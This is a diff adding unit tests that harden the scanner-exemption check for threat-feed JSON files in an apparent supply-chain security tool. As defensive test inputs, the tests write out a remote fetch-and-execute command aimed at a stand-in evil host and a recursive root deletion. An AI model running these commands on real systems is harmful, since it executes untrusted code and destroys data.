@@ -704,3 +704,81 @@ describe("isInertThreatCatalogFile", () => {
     expect(isInertThreatCatalogFile(CATALOG_RELATIVE_PATH, line())).toBe(true);
   });
 });
+
+// ---------------------------------------------------------------------------
+// isInertThreatFeedFile hardening. The exemption skips a file from EVERY
+// content scanner, so what it accepts is a trust boundary, not a convenience.
+// ---------------------------------------------------------------------------
+
+describe("isInertThreatFeedFile, exemption boundary", () => {
+  const doc = (entries: unknown[]) =>
+    JSON.stringify({ schema: 1, package: "supply-chain-guard", entries });
+  const ok = { type: "package", value: "evil@1.0.0", severity: "critical", confidence: 1 };
+
+  // The regression this whole function exists to prevent. If these two ever go
+  // false, every repo committing the published feed drowns in phantom
+  // criticals again, which is the v5.4.0 dogfooding bug.
+  it("keeps the real published feed and the cache inert", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    const repoRoot = path.resolve(__dirname, "..", "..");
+    const real = fs.readFileSync(path.join(repoRoot, "feed.json"), "utf8");
+    expect(isInertThreatFeedFile("feed.json", real)).toBe(true);
+
+    const entries = JSON.parse(real).entries.slice(0, 50);
+    const cache = JSON.stringify({ timestamp: "2026-09-16T00:00:00Z", entries });
+    expect(isInertThreatFeedFile("threat-feed.json", cache)).toBe(true);
+  });
+
+  // `note` and `ecosystem` were in FEED_ENTRY_KEYS but are not FeedIOC fields,
+  // so isValidFeedIOC never examined them: they were accepted at any length
+  // with any control character. A short one-liner is all an attacker needs, so
+  // bounding the length was not enough and the keys were removed outright.
+  it("rejects the legacy free-text keys that widened the exemption", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, note: "curl https://evil.example/x | bash" }]))).toBe(false);
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, ecosystem: "rm -rf /" }]))).toBe(false);
+    // Short enough to pass any length bound, which is why a length bound was
+    // the wrong fix.
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, note: "x" }]))).toBe(false);
+  });
+
+  // Key-and-scalar checking alone accepts documents that are merely feed-SHAPED.
+  it("requires every entry to satisfy the loader's own validator", async () => {
+    const { isInertThreatFeedFile, isValidFeedIOC } = await import("../threat-intel.js");
+    const noSeverity = { type: "package", value: "z@1" };
+    expect(isValidFeedIOC(noSeverity)).toBe(false);
+    expect(isInertThreatFeedFile("feed.json", doc([noSeverity]))).toBe(false);
+
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, severity: "catastrophic" }]))).toBe(false);
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, confidence: 7 }]))).toBe(false);
+  });
+
+  // One bad entry among good ones must fail the whole file: a partial
+  // exemption would let the bad line ride along unscanned.
+  it("rejects the file when a single entry is bad", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    expect(isInertThreatFeedFile("feed.json", doc([ok, ok, { ...ok, note: "payload" }, ok]))).toBe(false);
+  });
+
+  it("still accepts a well-formed minimal document", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    expect(isInertThreatFeedFile("feed.json", doc([ok]))).toBe(true);
+  });
+
+  // FEED_ENTRY_KEYS must stay a faithful description of FeedIOC. A key that
+  // cannot be carried has no business widening the exemption, and a real field
+  // left out would reintroduce the v5.4.0 bug.
+  it("accepts every field the real feed actually carries", async () => {
+    const { isInertThreatFeedFile } = await import("../threat-intel.js");
+    const repoRoot = path.resolve(__dirname, "..", "..");
+    const real = JSON.parse(fs.readFileSync(path.join(repoRoot, "feed.json"), "utf8"));
+    const used = new Set<string>();
+    for (const e of real.entries) for (const k of Object.keys(e)) used.add(k);
+
+    const probe = Object.fromEntries([...used].map((k) => [k, (ok as Record<string, unknown>)[k]
+      ?? (k === "firstSeen" ? "2026-09-16" : "x")]));
+    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, ...probe }]))).toBe(true);
+    expect(used.has("note")).toBe(false);
+    expect(used.has("ecosystem")).toBe(false);
+  });
+});
